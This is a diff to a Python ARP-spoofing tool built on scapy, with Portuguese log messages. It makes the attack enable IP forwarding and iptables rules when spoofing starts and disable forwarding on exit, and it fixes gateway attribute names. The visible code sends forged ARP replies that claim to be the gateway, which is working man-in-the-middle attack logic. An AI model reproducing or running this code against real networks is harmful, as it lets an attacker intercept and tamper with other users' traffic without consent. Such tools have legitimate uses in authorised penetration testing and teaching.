@@ -5,7 +5,7 @@ from scapy.all import *
 from netaddr import IPNetwork, IPRange, IPAddress, AddrFormatError
 import threading
 from time import sleep
-
+from utils import *
 
 
 class ARPspoof(object):
@@ -36,6 +36,9 @@ class ARPspoof(object):
 	def start(self):
 		self.socket = conf.L3socket(iface=self.interface)
 		self.socket2 = conf.L2socket(iface=self.interface)
+		set_ip_forwarding(1)
+		iptables()
+		
 
 		if self.arpmode == 'rep':
 			t = threading.Thread(name='ARPspoof-rep', target=self.spoof, args=('is-at',))
@@ -100,7 +103,7 @@ class ARPspoof(object):
 			if ARP in pkt and pkt[ARP].op == 1:
 				packet = None
 
-				if (str(pkt[ARP].hwdst) == '00:00:00:00:00:00' and str(pkt[ARP].pdst) == self.gatewayip and self.myip != str(pkt[ARP].psrc)):
+				if (str(pkt[ARP].hwdst) == '00:00:00:00:00:00' and str(pkt[ARP].pdst) == self.gateway and self.myip != str(pkt[ARP].psrc)):
 					print '[ARPmon] {} está perguntando quem é o gateway. Enviando : "Eu sou o gateway!" como resposta'.format(pkt[ARP].psrc)
 					packet = ARP()
 					packet.op = 2
@@ -116,7 +119,7 @@ class ARPspoof(object):
 					packet.hwdst = '00:00:00:00:00:00'
 					packet.pdst = str(pkt[ARP].pdst)
 
-				elif (str(pkt[ARP].hwsrc) == self.gatewaymac and str(pkt[ARP].hwdst) == '00:00:00:00:00:00' and self.myip == str(pkt[ARP].pdst)):
+				elif (str(pkt[ARP].hwsrc) == self.gateway_mac and str(pkt[ARP].hwdst) == '00:00:00:00:00:00' and self.myip == str(pkt[ARP].pdst)):
 					print "[ARPmon] Gateway está perguntando onde está {}. Enviando: 'Sou {}!'".format(pkt[ARP].pdst)
 					packet = ARP()
 					packet.op = 2
@@ -215,5 +218,7 @@ class ARPspoof(object):
 						if "Interrupted system call" not in e:
 							print "Exceção ocorreu enquanto envenava {}: {}".format(targetip, e)
 
+		
+		set_ip_forwarding(0)
 		self.socket.close()
 		self.socket2.close()
